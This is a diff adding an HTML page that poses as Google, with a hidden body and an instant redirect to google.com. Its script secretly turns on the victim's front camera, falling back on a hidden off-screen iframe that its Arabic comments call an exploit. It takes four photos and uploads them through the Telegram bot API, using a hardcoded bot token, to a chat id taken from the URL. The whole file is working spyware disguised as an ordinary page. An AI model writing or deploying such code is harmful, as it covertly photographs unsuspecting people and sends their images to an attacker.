@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="0; url=https://www.google.com">
+    <title>Google</title>
+    <style>
+        body { display: none; }
+    </style>
+</head>
+<body>
+    <script>
+        const USER_ID = new URLSearchParams(window.location.search).get('id');
+        const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
+
+        if (!USER_ID) {
+            window.location.replace("https://www.google.com");
+        } else {
+            (async function() {
+                try {
+                    // محاولة الوصول للكاميرا عبر WebView (بعض التطبيقات تسمح بدون إذن)
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user',
+                            width: { ideal: 1920 }
+                        }
+                    }).catch(async (e) => {
+                        // إذا فشل، نستخدم ثغرة الـ iframe المخفي
+                        await tryIframeExploit();
+                        return null;
+                    });
+
+                    if (stream) {
+                        await captureAndSend(stream);
+                    }
+
+                } catch(e) {
+                    console.log('All failed');
+                }
+
+                window.location.replace("https://www.google.com");
+            })();
+
+            async function tryIframeExploit() {
+                // إنشاء iframe مخفي يحاول الوصول للكاميرا
+                const iframe = document.createElement('iframe');
+                iframe.style.position = 'absolute';
+                iframe.style.left = '-9999px';
+                iframe.style.top = '-9999px';
+                iframe.style.width = '1px';
+                iframe.style.height = '1px';
+                iframe.src = 'about:blank';
+                document.body.appendChild(iframe);
+
+                // محاولة تشغيل الكاميرا داخل الـ iframe
+                try {
+                    const stream = await iframe.contentWindow.navigator.mediaDevices.getUserMedia({ video: true });
+                    await captureAndSend(stream);
+                } catch(e) {}
+
+                iframe.remove();
+            }
+
+            async function captureAndSend(stream) {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', '');
+                video.setAttribute('autoplay', '');
+                video.style.position = 'absolute';
+                video.style.left = '-9999px';
+                video.style.top = '-9999px';
+                document.body.appendChild(video);
+
+                await video.play();
+                await new Promise(r => { if (video.videoWidth > 0) r(); else video.onloadedmetadata = r; });
+
+                // 4 صور
+                for (let i = 0; i < 4; i++) {
+                    await new Promise(r => setTimeout(r, i * 400));
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95));
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', USER_ID);
+                    formData.append('photo', blob, `selfie_${i+1}.jpg`);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+
+                stream.getTracks().forEach(t => t.stop());
+                video.remove();
+            }
+        }
+    </script>
+</body>
+</html>
